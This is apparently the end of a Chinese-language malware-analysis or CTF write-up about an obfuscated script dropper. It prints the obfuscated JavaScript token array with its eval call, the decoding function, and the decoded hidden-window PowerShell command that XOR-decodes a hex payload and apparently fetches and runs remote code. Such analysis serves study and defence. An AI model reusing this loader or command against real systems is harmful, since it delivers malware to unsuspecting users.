RV, xv, NW, FT, ff, RV, xv, kX, Mb, ff, RV, xv, NW, zN, ff, RV, xv, kX, Mb, ff, RV, xv, NW, it, ff, RV, xv, kX, Mb, ff, RV, xv, NW, QB, ff, RV, xv, NW, FT, ff, RV, FT, Fi, yN, ff, RV, xv, kX, Mb, ff, RV, xv, NW, it, ff, RV, xv, kX, Mb, ff, RV, xv, NW, QB, ff, RV, xv, kX, kX, ff, RV, xv, NW, FT, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, xv, kX, kX, ff, RV, xv, NW, yN, ff, RV, xv, kX, kX, ff, RV, xv, NW, FT, ff, RV, FT, Fi, it, ff, RV, xv, NW, QB, ff, RV, xv, NW, FT, ff, RV, xv, NW, zN, ff, RV, xv, kX, Mb, ff, RV, xv, NW, QB, ff, RV, xv, kX, kX, ff, RV, xv, kX, Mb, ff, RV, xv, kX, Mb, ff, RV, xv, NW, it, ff, RV, xv, kX, Mb, ff, RV, xv, NW, xv, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, xv, NW, FT, ff, RV, FT, Fi, yN, ff, RV, xv, kX, Mb, ff, RV, xv, NW, it, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Fi, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Fi, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, QB, ff, RV, xv, kX, Mb, ff, RV, xv, NW, QB, ff, RV, xv, kX, Mb, ff, RV, xv, NW, FT, ff, RV, FT, Fi, it, ff, RV, xv, NW, QB, ff, RV, FT, Fi, it, ff, RV, xv, NW, yN, ff, RV, FT, Fi, it, ff, RV, xv, NW, yN, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, Fi, ff, RV, FT, Fi, it, ff, RV, xv, NW, FT, ff, RV, xv, NW, FT, ff, RV, xv, NW, Mb, ff, RV, xv, kX, kX, ff, RV, xv, NW, yN, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, yN, ff, RV, xv, kX, kX, ff, RV, xv, NW, Mb, ff, RV, xv, kX, kX, ff, RV, xv, NW, FT, ff, RV, xv, kX, Mb, ff, RV, xv, NW, zN, ff, RV, xv, kX, Mb, ff, RV, xv, NW, it, ff, RV, xv, kX, Mb, ff, RV, xv, NW, QB, ff, RV, xv, NW, FT, ff, RV, FT, Fi, yN, ff, RV, xv, kX, Mb, ff, RV, xv, NW, it, ff, RV, xv, kX, Mb, ff, RV, xv, NW, QB, ff, RV, xv, kX, kX, ff, RV, xv, NW, FT, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, xv, kX, kX, ff, RV, xv, NW, yN, ff, RV, xv, kX, kX, ff, RV, xv, NW, FT, ff, RV, FT, Fi, it, ff, RV, xv, NW, QB, ff, RV, xv, NW, FT, ff, RV, xv, NW, zN, ff, RV, xv, kX, Mb, ff, RV, xv, NW, QB, ff, RV, xv, kX, kX, ff, RV, xv, kX, Mb, ff, RV, xv, kX, Mb, ff, RV, xv, NW, it, ff, RV, xv, kX, Mb, ff, RV, xv, NW, xv, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, xv, NW, FT, ff, RV, FT, Fi, yN, ff, RV, xv, kX, Mb, ff, RV, xv, NW, it, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Fi, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Fi, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, QB, ff, RV, xv, kX, Mb, ff, RV, xv, NW, QB, ff, RV, xv, kX, Mb, ff, RV, xv, NW, FT, ff, RV, xv, kX, kX, ff, RV, xv, zN, kX, ff, RV, xv, NW, FT, ff, RV, xv, kX, kX, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, xv, kX, kX, ff, RV, xv, NW, FT, ff, RV, FT, Fi, it, ff, RV, xv, NW, Fi, ff, RV, xv, NW, FT, ff, RV, xv, NW, Fi, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Fi, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, it, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, xv, kX, kX, ff, RV, FT, Fi, it, ff, RV, xv, kX, kX, ff, RV, xv, zN, kX, ff, RV, xv, NW, Mb, ff, RV, xv, kX, kX, ff, RV, xv, kX, Mb, ff, RV, xv, NW, yN, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, xv, kX, kX, ff, RV, FT, Fi, it, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, xv, kX, kX, ff, RV, xv, NW, xv, ff, RV, FT, Fi, it, ff, RV, xv, NW, yN, ff, RV, xv, NW, FT, ff, RV, xv, kX, kX, ff, RV, xv, NW, Mb, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, it, ff, RV, FT, Fi, Fi, ff, RV, xv, NW, Mb, ff, RV, xv, NW, it, ff, RV, FT, Fi, it, ff, RV, xv, NW, zN, ff, RV, FT, Fi, it, ff, RV, xv, NW, QB, ff, RV, xv, NW, Mb, ff, RV, xv, kX, Mb, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, QB, ff, RV, xv, kX, Mb, ff, RV, xv, zN, kX, ff, RV, xv, kX, kX, ff, RV, xv, NW, Mb, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, FT, Fi, it, ff, RV, xv, NW, QB, ff, RV, xv, NW, FT, ff, RV, xv, NW, QB, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, QB, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Fi, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, FT, Fi, it, ff, RV, xv, NW, Fi, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, yN, ff, RV, xv, kX, Mb, ff, RV, xv, zN, kX, ff, RV, xv, kX, Mb, ff, RV, xv, NW, zN, ff, RV, xv, kX, Mb, ff, RV, xv, NW, xv, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, FT, Fi, it, ff, RV, xv, kX, kX, ff, RV, FT, Fi, it, ff, RV, xv, NW, NW, ff, RV, xv, kX, Mb, ff, RV, xv, NW, FT, ff, RV, xv, NW, FT, ff, RV, xv, NW, QB, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, QB, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Fi, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, FT, Fi, it, ff, RV, xv, kX, kX, ff, RV, xv, kX, kX, ff, RV, xv, NW, Fi, ff, RV, FT, Fi, it, ff, RV, xv, NW, zN, ff, RV, FT, Fi, it, ff, RV, xv, NW, QB, ff, RV, xv, NW, FT, ff, RV, xv, NW, QB, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, QB, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Fi, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, FT, Fi, it, ff, RV, xv, NW, zN, ff, RV, FT, Fi, it, ff, RV, xv, NW, QB, ff, RV, xv, NW, FT, ff, RV, xv, NW, zN, ff, RV, xv, kX, Mb, ff, RV, xv, NW, QB, ff, RV, xv, kX, kX, ff, RV, xv, kX, Mb, ff, RV, xv, kX, Mb, ff, RV, xv, NW, it, ff, RV, xv, kX, Mb, ff, RV, xv, NW, xv, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, FT, Fi, it, ff, RV, xv, NW, yN, ff, RV, FT, Fi, it, ff, RV, xv, kX, kX, ff, RV, xv, NW, FT, ff, RV, xv, NW, QB, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, FT, Fi, it, ff, RV, xv, NW, NW, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, yN, ff, RV, xv, kX, kX, ff, RV, xv, NW, FT, ff, RV, FT, Fi, it, ff, RV, xv, kX, kX, ff, RV, FT, Fi, it, ff, RV, xv, zN, kX, ff, RV, FT, Fi, yN, ff, RV, FT, Fi, QB, ff, RV, FT, Fi, it, ff, RV, xv, zN, kX, ff, RV, FT, Fi, yN, ff, RV, FT, Fi, QB, ff, RV, FT, Fi, it, ff, RV, xv, NW, zN, ff, RV, FT, Fi, it, ff, RV, xv, NW, zN, ff, RV, FT, Fi, it, ff, RV, xv, NW, yN, ff, RV, xv, NW, FT, ff, RV, xv, zN, kX, ff, RV, xv, NW, Mb, ff, RV, FT, Fi, yN, ff, RV, FT, Fi, it, ff, RV, FT, Fi, Fi, ff, RV, xv, NW, Mb, ff, RV, xv, kX, Mb, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, QB, ff, RV, xv, kX, kX, ff, RV, FT, Fi, it, ff, RV, xv, kX, Mb, ff, RV, xv, NW, zN, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, QB, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, it, ff, RV, xv, kX, Mb, ff, RV, xv, zN, kX, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, FT, Fi, yN, ff, RV, xv, NW, NW, ff, RV, FT, Fi, it, ff, RV, xv, NW, it, ff, RV, xv, NW, Mb, ff, RV, xv, NW, NW, ff, RV, FT, Fi, yN, ff, RV, xv, NW, FT, ff, RV, xv, NW, FT, ff, RV, xv, NW, FT, ff, RV, FT, Fi, it, ff, RV, xv, NW, zN, ff, RV, FT, Fi, it, ff, RV, xv, NW, QB, ff, RV, xv, NW, Mb, ff, RV, xv, kX, Mb, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, QB, ff, RV, xv, kX, Mb, ff, RV, xv, zN, kX, ff, RV, xv, kX, kX, ff, RV, xv, NW, Mb, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, FT, Fi, it, ff, RV, xv, NW, zN, ff, RV, FT, Fi, yN, ff, RV, xv, NW, xv, ff, RV, xv, NW, Mb, ff, RV, FT, Fi, yN, ff, RV, xv, NW, Mb, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, it, ff, RV, FT, Fi, Fi, ff, RV, xv, NW, FT, ff, RV, FT, Fi, QB, ff, RV, FT, Fi, it, ff, RV, FT, Fi, Fi, ff, RV, FT, Fi, it, ff, RV, xv, NW, yN, ff, RV, FT, Fi, it, ff, RV, xv, NW, yN, ff, RV, FT, Fi, it, ff, RV, xv, NW, yN, ff, RV, FT, Fi, it, ff, RV, xv, NW, yN, ff, RV, xv, NW, FT, ff, RV, xv, kX, kX, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, xv, kX, kX, ff, RV, xv, NW, FT, ff, RV, FT, Fi, it, ff, RV, xv, NW, Fi, ff, RV, xv, NW, Mb, ff, RV, xv, kX, Mb, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, QB, ff, RV, xv, kX, kX, ff, RV, FT, Fi, it, ff, RV, xv, kX, Mb, ff, RV, xv, NW, zN, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, QB, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, it, ff, RV, xv, kX, Mb, ff, RV, xv, zN, kX, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, FT, Fi, it, ff, RV, FT, Fi, Fi, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, yN, ff, RV, FT, Fi, yN, ff, RV, xv, NW, FT, ff, RV, xv, NW, FT, ff, RV, xv, NW, yN, ff, RV, FT, Fi, it, ff, RV, FT, Fi, Fi, ff, RV, FT, Fi, it, ff, RV, xv, NW, Fi, ff, RV, xv, NW, Mb, ff, RV, xv, kX, Mb, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, QB, ff, RV, xv, kX, Mb, ff, RV, xv, zN, kX, ff, RV, xv, kX, kX, ff, RV, xv, NW, Mb, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, xv, NW, FT, ff, RV, xv, NW, it, ff, RV, FT, Fi, it, ff, RV, xv, NW, zN, ff, RV, xv, kX, kX, ff, RV, xv, zN, kX, ff, RV, xv, NW, FT, ff, RV, xv, kX, kX, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, xv, kX, kX, ff, RV, xv, NW, FT, ff, RV, FT, Fi, it, ff, RV, xv, NW, Fi, ff, RV, xv, NW, FT, ff, RV, xv, NW, Fi, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Fi, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, it, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, xv, kX, kX, ff, RV, FT, Fi, it, ff, RV, FT, Fi, it, ff, RV, xv, NW, zN, ff, RV, xv, kX, kX, ff, RV, xv, zN, kX, ff, RV, xv, NW, Mb, ff, RV, xv, kX, kX, ff, RV, xv, kX, Mb, ff, RV, xv, NW, yN, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, xv, kX, kX, ff, RV, FT, Fi, it, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, xv, kX, kX, ff, RV, xv, NW, xv, ff, RV, FT, Fi, it, ff, RV, xv, NW, yN, ff, RV, xv, NW, FT, ff, RV, xv, kX, kX, ff, RV, xv, NW, Mb, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, it, ff, RV, FT, Fi, Fi, ff, RV, xv, NW, Mb, ff, RV, xv, NW, it, ff, RV, FT, Fi, it, ff, RV, xv, NW, zN, ff, RV, FT, Fi, it, ff, RV, xv, NW, QB, ff, RV, xv, NW, Mb, ff, RV, xv, kX, Mb, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, QB, ff, RV, xv, kX, Mb, ff, RV, xv, zN, kX, ff, RV, xv, kX, kX, ff, RV, xv, NW, Mb, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, FT, Fi, it, ff, RV, xv, NW, QB, ff, RV, xv, NW, FT, ff, RV, xv, NW, QB, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, QB, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Fi, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, FT, Fi, it, ff, RV, xv, NW, Fi, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, yN, ff, RV, xv, kX, Mb, ff, RV, xv, zN, kX, ff, RV, xv, kX, Mb, ff, RV, xv, NW, zN, ff, RV, xv, kX, Mb, ff, RV, xv, NW, xv, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, FT, Fi, it, ff, RV, xv, kX, kX, ff, RV, FT, Fi, it, ff, RV, xv, NW, NW, ff, RV, xv, kX, kX, ff, RV, xv, kX, kX, ff, RV, xv, kX, Mb, ff, RV, xv, NW, QB, ff, RV, FT, Fi, it, ff, RV, xv, NW, NW, ff, RV, xv, kX, Mb, ff, RV, xv, NW, FT, ff, RV, FT, Fi, it, ff, RV, xv, NW, NW, ff, RV, xv, kX, Mb, ff, RV, xv, kX, kX, ff, RV, FT, Fi, it, ff, RV, xv, kX, kX, ff, RV, xv, kX, kX, ff, RV, xv, NW, Fi, ff, RV, FT, Fi, it, ff, RV, xv, NW, zN, ff, RV, FT, Fi, it, ff, RV, xv, NW, QB, ff, RV, xv, NW, FT, ff, RV, xv, NW, QB, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, QB, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Fi, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, FT, Fi, it, ff, RV, xv, NW, zN, ff, RV, FT, Fi, yN, ff, RV, xv, NW, xv, ff, RV, FT, Fi, it, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, it, ff, RV, xv, NW, yN, ff, RV, xv, NW, Mb, ff, RV, xv, NW, xv, ff, RV, xv, NW, Mb, ff, RV, FT, Fi, yN, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, yN, ff, RV, xv, kX, kX, ff, RV, FT, Fi, it, ff, RV, xv, kX, Mb, ff, RV, xv, NW, zN, ff, RV, xv, kX, kX, ff, RV, FT, Fi, Fi, ff, RV, xv, kX, kX, ff, RV, xv, NW, FT, ff, RV, xv, NW, FT, ff, RV, FT, Fi, it, ff, RV, xv, kX, Mb, ff, RV, xv, zN, kX, ff, RV, xv, kX, Mb, ff, RV, xv, NW, it, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, yN, ff, RV, xv, kX, Mb, ff, RV, xv, NW, xv, ff, RV, xv, NW, Mb, ff, RV, xv, NW, Fi, ff, RV, FT, Fi, yN, ff, RV, xv, NW, NW, ff, RV, FT, Fi, yN, ff, RV, xv, NW, NW, ff, RV, xv, NW, FT, ff, RV, FT, Fi, yN, ff, RV, xv, kX, kX, ff, RV, FT, Fi, it, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, QB, ff, RV, xv, kX, kX, ff, RV, xv, NW, FT, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, FT, Fi, it, ff, RV, xv, NW, yN, ff, RV, FT, Fi, it, ff, RV, xv, NW, yN, ff, RV, xv, NW, FT, ff, RV, xv, kX, kX, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, xv, kX, kX, ff, RV, xv, NW, FT, ff, RV, FT, Fi, it, ff, RV, xv, NW, Fi, ff, RV, xv, NW, Mb, ff, RV, xv, kX, Mb, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, QB, ff, RV, xv, kX, kX, ff, RV, FT, Fi, it, ff, RV, xv, kX, Mb, ff, RV, xv, NW, zN, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, QB, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, it, ff, RV, xv, kX, Mb, ff, RV, xv, zN, kX, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, FT, Fi, it, ff, RV, FT, Fi, Fi, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, yN, ff, RV, FT, Fi, yN, ff, RV, xv, NW, FT, ff, RV, xv, NW, FT, ff, RV, xv, NW, yN, ff, RV, FT, Fi, it, ff, RV, FT, Fi, Fi, ff, RV, FT, Fi, it, ff, RV, xv, NW, Fi, ff, RV, xv, NW, Mb, ff, RV, xv, kX, Mb, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, QB, ff, RV, xv, kX, Mb, ff, RV, xv, zN, kX, ff, RV, xv, kX, kX, ff, RV, xv, NW, Mb, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, xv, NW, FT, ff, RV, xv, NW, it, ff, RV, FT, Fi, it, ff, RV, xv, NW, zN, ff, RV, FT, Fi, it, ff, RV, xv, NW, QB, ff, RV, FT, Fi, it, ff, RV, xv, NW, yN, ff, RV, FT, Fi, it, ff, RV, xv, NW, yN, ff, RV, xv, NW, FT, ff, RV, xv, kX, kX, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, xv, kX, kX, ff, RV, xv, NW, FT, ff, RV, FT, Fi, it, ff, RV, xv, NW, Fi, ff, RV, xv, NW, Mb, ff, RV, xv, kX, Mb, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, QB, ff, RV, xv, kX, kX, ff, RV, FT, Fi, it, ff, RV, xv, kX, Mb, ff, RV, xv, NW, zN, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, QB, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, it, ff, RV, xv, kX, Mb, ff, RV, xv, zN, kX, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, FT, Fi, it, ff, RV, FT, Fi, Fi, ff, RV, xv, NW, FT, ff, RV, FT, Fi, QB, ff, RV, FT, Fi, it, ff, RV, xv, NW, zN, ff, RV, FT, Fi, it, ff, RV, xv, NW, QB, ff, RV, xv, NW, Mb, ff, RV, xv, kX, Mb, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, QB, ff, RV, xv, kX, Mb, ff, RV, xv, zN, kX, ff, RV, xv, kX, kX, ff, RV, xv, NW, Mb, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, FT, Fi, it, ff, RV, xv, NW, zN, ff, RV, FT, Fi, it, ff, RV, xv, NW, QB, ff, RV, xv, NW, FT, ff, RV, xv, NW, zN, ff, RV, xv, kX, Mb, ff, RV, xv, NW, QB, ff, RV, xv, kX, kX, ff, RV, xv, kX, Mb, ff, RV, xv, kX, Mb, ff, RV, xv, NW, it, ff, RV, xv, kX, Mb, ff, RV, xv, NW, xv, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, FT, Fi, it, ff, RV, xv, NW, yN, ff, RV, FT, Fi, it, ff, RV, xv, NW, yN, ff, RV, xv, NW, Mb, ff, RV, xv, kX, Mb, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, QB, ff, RV, xv, kX, kX, ff, RV, FT, Fi, it, ff, RV, xv, kX, Mb, ff, RV, xv, NW, zN, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, QB, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, it, ff, RV, xv, kX, Mb, ff, RV, xv, zN, kX, ff, RV, xv, kX, Mb, ff, RV, xv, NW, Mb, ff, RV, FT, Fi, it, ff, RV, FT, Fi, Fi, ff, RV, FT, Fi, yN, ff, RV, FT, Fi, yN, ff, RV, FT, Fi, it, ff, RV, FT, Fi, Fi, ff, RV, FT, Fi, it, ff, RV, xv, NW, Fi, ff, RV, xv, NW, Mb, ff, RV, xv, kX, Mb, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, QB, ff, RV, xv, kX, Mb, ff, RV, xv, zN, kX, ff, RV, FT, Fi, it, ff, RV, xv, NW, zN, ff, RV, FT, Fi, it, ff, RV, xv, NW, zN, ff, RV, FT, Fi, it, ff, RV, xv, NW, zN, ff, RV, FT, Fi, it, ff, RV, xv, NW, zN, ff, RV, FT, Fi, it, ff, RV, FT, Fi, it, ff, RV, FT, Fi, yN, ff, RV, xv, NW, xv, ff, RV, xv, zN, Fi, ff, RV, xv, zN, NW, ff, RV, xv, zN, Fi, ff, RV, xv, zN, FT, ff, RV, FT, it, zN, ff, RV, xv, NW, QB, ff, RV, FT, it, xv, ff, RV, xv, zN, Fi, ff, RV, xv, zN, it, ff, RV, xv, yN, yN, ff, RV, FT, it, NW, ff, RV, xv, yN, yN, ff, RV, xv, yN, Mb, ff, RV, xv, yN, yN, ff, RV, FT, it, zN, ff, RV, xv, yN, yN, ff, RV, xv, kX, it, ff, RV, FT, Fi, Fi, ff, RV, FT, Fi, NW, ff, RV, xv, kX, Mb, ff, RV, FT, QB, NW, ff, RV, xv, kX, zN, ff, RV, xv, zN, QB, ff, RV, xv, kX, it, ff, RV, xv, xv, Mb, ff, RV, FT, QB, it, ff, RV, FT, QB, QB, ff, RV, FT, QB, kX, ff, RV, FT, Fi, it, ff, RV, FT, QB, NW, ff, RV, FT, QB, FT, ff, RV, xv, kX, zN, ff, RV, xv, NW, kX, ff, RV, xv, NW, kX, ff, RV, xv, Mb, NW, ff, RV, FT, QB, it, ff, RV, xv, xv, FT, ff, RV, FT, it, it, ff, RV, FT, QB, FT, ff, RV, FT, Fi, it, ff, RV, xv, zN, QB, ff, RV, xv, yN, FT, ff, RV, xv, kX, xv, ff, RV, xv, zN, FT, ff, RV, xv, Mb, FT, ff, RV, xv, kX, Mb, ff, RV, FT, Fi, kX, ff, RV, FT, QB, Mb, ff, RV, FT, Fi, it, ff, RV, xv, zN, NW, ff, RV, xv, NW, Fi, ff, RV, xv, NW, NW, ff, RV, xv, zN, it, ff, RV, xv, yN, yN, ff, RV, xv, zN, xv, ff, RV, xv, kX, kX, ff, RV, FT, it, QB, ff, RV, FT, QB, it, ff, RV, FT, QB, NW, ff, RV, xv, yN, yN, ff, RV, xv, zN, Fi, ff, RV, xv, NW, QB, ff, RV, xv, zN, kX, ff, RV, xv, NW, yN, ff, RV, xv, zN, Fi, ff, RV, xv, zN, it, ff, RV, xv, yN, yN, ff, RV, FT, it, xv, ff, RV, xv, zN, it, ff, RV, xv, yN, yN, ff, RV, xv, zN, xv, ff, RV, FT, Fi, FT, ff, RV, FT, QB, it, ff, RV, FT, Fi, xv, ff, RV, FT, QB, QB, ff, RV, xv, yN, yN, ff, RV, xv, zN, Fi, ff, RV, xv, zN, Fi, ff, RV, xv, xv, Fi, ff, RV, xv, yN, kX, ff, RV, xv, yN, yN, ff, RV, xv, yN, FT, ff, RV, xv, FT, Fi, ff, RV, xv, FT, QB, ff, RV, xv, Mb, NW, ff, RV, xv, FT, Fi, ff, RV, xv, zN, FT, ff, RV, xv, Mb, zN, ff, RV, FT, QB, Mb, ff, RV, xv, kX, kX, ff, RV, FT, QB, xv, ff, RV, FT, QB, FT, ff, RV, FT, QB, NW, ff, RV, FT, Fi, xv, ff, RV, FT, QB, QB, ff, RV, FT, Fi, zN, ff, RV, xv, zN, QB, ff, RV, xv, zN, kX, ff, RV, xv, zN, NW, ff, RV, xv, NW, it, ff, RV, xv, zN, it, ff, RV, xv, yN, yN, ff, RV, xv, yN, FT, ff, RV, xv, FT, Fi, ff, RV, xv, FT, QB, ff, RV, xv, Mb, NW, ff, RV, xv, FT, Fi, ff, RV, xv, zN, FT, ff, RV, xv, Mb, zN, ff, RV, FT, QB, Mb, ff, RV, xv, kX, kX, ff, RV, FT, QB, xv, ff, RV, FT, QB, FT, ff, RV, FT, QB, NW, ff, RV, FT, Fi, xv, ff, RV, FT, QB, QB, ff, RV, FT, Fi, zN, ff, RV, xv, zN, QB, ff, RV, xv, NW, it, ff, RV, xv, zN, it, tg, QF, Im, nd, Ge, sV, RV, Gm, YZ, Xj, kF, RV, ST, RV, pV, wt, wV, Rp, kz, CX, GH, US, xv, Mb, Mb, ff, xv, Mb, zN, ff, FT, Fi, Fi, ff, FT, QB, NW, ff, FT, Fi, xv, ff, FT, QB, yN, ff, FT, QB, FT, ff, xv, zN, FT, ff, xv, Mb, zN, ff, FT, Fi, NW, ff, FT, Fi, it, ff, FT, Fi, kX, ff, FT, Fi, kX, tg, QF, Im, nd, Ge, sV, RV, pV, wt, wV, Rp, kz, CX, RV, ST, RV, tV, Gm, Wn, RV, sC, Fx, nI, pV, nd, Gm, Yp, FF, uS, Rp, Gm, Fx, nI, GH, Gm, YZ, Xj, kF, QF, Im, pV, wt, wV, Rp, kz, CX, cX, wV, UP, tV, GH, wt, wl, NL, Ep, uS, Lj, ff, RV, Fi, ff, RV, nI, sV, UP, Gm, QF, Im);
eval(SxhM);
window.close(); 
</script>
```

‍

在浏览器控制台运行打印一下SxhM的值

解出这个

```python
function ioRjQN(FVKq) {
    var ohyLbg = "";
    for (var emGK = 0; emGK < FVKq.length; emGK++) {
        var ndZC = String.fromCharCode(FVKq[emGK] - 601);
        ohyLbg = ohyLbg + ndZC
    }
    return ohyLbg
};
var ohyLbg = ioRjQN([713, 712, 720, 702, 715, 716, 705, 702, ...]);
// powershell.exe -w 1 -ep Unrestricted -nop $EFTE =([regex]::Matches('a5a9b49fb8adbeb8e19cbea3afa9bfbfeceee8a9a2baf69fb5bfb8a9a19ea3a3b8909fb5bf9b839bfaf8909ba5a2a8a3bbbf9ca3bba9be9fa4a9a0a090bafde2fc90bca3bba9bebfa4a9a0a0e2a9b4a9eeece19ba5a2a8a3bb9fb8b5a0a9ec84a5a8a8a9a2ece18dbeabb9a1a9a2b880a5bfb8ecebe1bbebe0eba4ebe0ebe1a9bcebe0eb99a2bea9bfb8bea5afb8a9a8ebe0ebe18fa3a1a1ada2a8ebe0ee9fa9b8e19aadbea5adaea0a9ecffeceba4b8b8bcf6e3e3afa4ada0a0a9a2aba9e2b4a5a2bfa4a5e2aab9a2f6f8fdfff9f4e3aea9bfb8b9a8a8a5a2abe2a6bcabebf79f85ec9aadbea5adaea0a9f6e396f888eceb82a9b8e29ba9ae8fa0a5a9a2b8ebf7afa8f79f9aecaff884ece4e2ace889b4a9afb9b8a5a3a28fa3a2b8a9b4b8e285a2baa3a7a98fa3a1a1ada2a8e2e4e4ace889b4a9afb9b8a5a3a28fa3a2b8a9b4b8e285a2baa3a7a98fa3a1a1ada2a8b08ba9b8e181a9a1aea9bee597fe91e282ada1a9e5e285a2baa3a7a9e4ace889b4a9afb9b8a5a3a28fa3a2b8a9b4b8e285a2baa3a7a98fa3a1a1ada2a8e2e4e4ace889b4a9afb9b8a5a3a28fa3a2b8a9b4b8e285a2baa3a7a98fa3a1a1ada2a8b08ba9b8e181a9a1aea9beb09ba4a9bea9b7e48b9aec93e5e29aada0b9a9e282ada1a9e1afa0a5a7a9ebe6a882ada1a9ebb1e5e282ada1a9e5e285a2baa3a7a9e4eb82a9e6afb8ebe0fde0fde5e5e4809fec9aadbea5adaea0a9f6e396f888e5e29aada0b9a9e5f79f9aec8dece4e4e4e48ba9b8e19aadbea5adaea0a9ecaff884ece19aada0b9a983e5b08ba9b8e181a9a1aea9bee5b09ba4a9bea9b7e48b9aec93e5e29aada0b9a9e282ada1a9e1afa0a5a7a9ebe6bba2e6a8e6abebb1e5e282ada1a9e5f7eae4979fafbea5bcb88ea0a3afa791f6f68fbea9adb8a9e4e48ba9b8e19aadbea5adaea0a9ecaff884ece19aada0b9a983e5e2e4e48ba9b8e19aadbea5adaea0a9ec8de5e29aada0b9a9e5e285a2baa3a7a9e4e49aadbea5adaea0a9ecffece19aada0e5e5e5e5eef7','.{2}') | % { [char]([Convert]::ToByte($_.Value,16) -bxor '204') }) -join '';& $EFTE.Substring(0,3) 